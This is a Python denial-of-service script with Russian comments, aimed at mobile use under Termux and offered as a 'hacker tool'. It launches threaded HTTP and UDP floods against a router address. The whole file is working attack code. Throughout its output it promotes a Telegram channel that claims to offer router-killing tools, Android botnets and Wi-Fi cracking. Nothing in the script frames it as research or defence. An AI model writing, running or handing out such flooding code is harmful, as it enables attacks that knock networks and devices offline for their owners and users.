import socket
import threading
import random
import time
import os

# ===== РЕКЛАМА ВАШЕГО КАНАЛА =====
TELEGRAM_CHANNEL = "https://t.me/zenlyhub"  # ПОДПИСЫВАЙТЕСЬ!
print(f"🔥 Хакерский инструмент для Termux: {TELEGRAM_CHANNEL}")
print("🔔 Подпишись для мобильных эксплойтов!")

# ===== НАСТРОЙКИ ДЛЯ TERMUX =====
TARGET_NET = "192.168.1.1"  # IP роутера
PORT_BOMB = [80, 443, 8080]  # Только HTTP(S) порты
THREADS = 50  # Меньше потоков для Termux
DURATION = 120  # Короче атака

# ===== HTTP FLOOD (оптимизировано) =====
USER_AGENTS = [
    "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.144",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
]

def generate_payload():
    """Генерация легковесных HTTP-запросов"""
    method = random.choice(["GET", "POST"])
    path = random.choice([
        "/", "/index.html", 
        f"/?cache={random.randint(1000,9999)}",
        "/login.php"
    ])
    payload = f"{method} {path} HTTP/1.1\r\n"
    payload += f"Host: {TARGET_NET}\r\n"
    payload += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
    payload += f"Referer: {TELEGRAM_CHANNEL}\r\n"
    
    if method == "POST":
        payload += "Content-Type: application/x-www-form-urlencoded\r\n"
        payload += f"Content-Length: {random.randint(100,500)}\r\n\r\n"
        payload += f"data={os.urandom(200).hex()}"
    else:
        payload += "\r\n"
    
    return payload.encode()

# ===== UDP FLOOD (работает без root) =====
def udp_flood():
    """UDP-флуд для перегрузки широковещательных запросов"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = os.urandom(1024)  # Случайные данные
            sock.sendto(payload, (TARGET_NET, random.randint(1000,65000)))
        except:
            pass

# ===== ОСНОВНАЯ АТАКА =====
def http_attack():
    """Упрощенная HTTP-атака для Termux"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_NET, random.choice(PORT_BOMB)))
            s.send(generate_payload())
            time.sleep(0.1)
            s.close()
        except:
            pass

# ===== ЗАПУСК =====
if __name__ == "__main__":
    print(f"\n[+] Запуск атаки на {TARGET_NET}")
    print(f"[+] Используется {THREADS} потоков")
    print(f"[+] Подробнее: {TELEGRAM_CHANNEL}\n")
    
    # Мониторинг ресурсов
    print("УСТАНОВИТЕ ЭТИ ПАКЕТЫ ПРЕЖДЕ ЧЕМ ПРОДОЛЖИТЬ:")
    print("pkg install python nmap -y")
    print("pip install requests\n")
    
    # Запуск потоков
    for i in range(THREADS):
        threading.Thread(target=http_attack, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()
        
        if i % 10 == 0:
            print(f"⏳ Запущено {i}/{THREADS} потоков | Подпишись: {TELEGRAM_CHANNEL}")
    
    # Обратный отсчет
    print(f"\n[!] Атака продлится {DURATION} сек. Не закрывайте Termux!")
    for t in range(DURATION, 0, -10):
        print(f"Осталось: {t} сек. | Канал: {TELEGRAM_CHANNEL}")
        time.sleep(10)
    
    print("\n[+] Атака завершена! Проверьте роутер")
    print(f"[+] Для мощных DDoS: {TELEGRAM_CHANNEL}")
    print("🔥 Там есть: RouterKiller Pro, ботнеты для Android, Wi-Fi Crack\n")